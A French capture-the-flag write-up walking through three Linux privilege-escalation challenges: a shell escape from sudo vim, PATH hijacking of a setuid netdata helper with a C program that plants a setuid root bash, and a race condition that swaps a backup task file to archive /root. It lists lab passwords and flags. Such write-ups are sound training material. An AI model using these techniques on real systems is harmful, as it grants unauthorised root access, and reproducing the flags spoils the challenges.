
Quand il y a cette erreur:
```
ssh martin@192.168.122.100
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ED25519 key sent by the remote host is
SHA256:fwcKDPJ1FPqk/98vDLPS2XbBCFxdYmUBgWHuCCBKP+Q.
Please contact your system administrator.
Add correct host key in /home/theo/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /home/theo/.ssh/known_hosts:48
Host key for 192.168.122.100 has changed and you have requested strict checking.
Host key verification failed.
```

Faire la commande:
```
ssh-keygen -R 192.168.122.100
```

## Chall 1

```
USER: chall1
SSH PASSWORD: Th1sCh4ll1sV3ryE4sy
```

```
sudo -l
```

![[IMG-20260123023204476.png]]

```
sudo /usr/bin/vim
```


```
:!/bin/bash
```

![[IMG-20260123023204547.png]]

![[IMG-20260123023204596.png]]

```
0xECE{V1m_Pr1v3sc_1s_Tr1v14l}
```

## Chall 2

```
USER: chall2
SSH PASSWORD: Ch4ll2_P4Th_H1j4ck_1s_FuN
```

```
find / -perm -4000 2>/dev/null
```

![[IMG-20260123023204646.png]]

```
ls -l /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

![[IMG-20260123023204688.png]]

```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo -h
```

![[IMG-20260123023204719.png]]

```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list --test
```

![[IMG-20260123023204753.png]]

```
cd /tmp
nano nvme.c
```

nvme.c:
```C
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash");
    return 0;
}

```

```
gcc nvme.c -o nvme
chmod +x nvme
```

![[IMG-20260123023204790.png]]

```
PATH=/tmp:$PATH 
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

![[IMG-20260123023204822.png]]

```
./rootbash -p
```

![[IMG-20260123023204865.png]]

```
0xECE{P4TH_H1J4CK_W1TH_S3TU1D}
```




## Chall 3

```
USER: chall3
SSH PASSWORD: Th1s_Ch4ll_Is_N0t_S0_E4sy
```


```
sudo -l
```

![[IMG-20260123023204899.png]]

```
#!/bin/bash

echo '{"directories_to_archive":["/home/chall3"],"destination":"/home/chall3/backups/"}' > task.json

sudo /usr/bin/backy.sh task.json &

sleep 0.02

echo '{"directories_to_archive":["/root"],"destination":"/home/chall3/backups/"}' > task.json

```


![[IMG-20260123023204931.png]]

```
tar -tf backup.tar
```

![[IMG-20260123023204968.png]]

```
tar -xf backup.tar
```

![[IMG-20260123023205000.png]]

```
0xECE{R4C3_W1NS_B3F0R3_CH3CK}
```

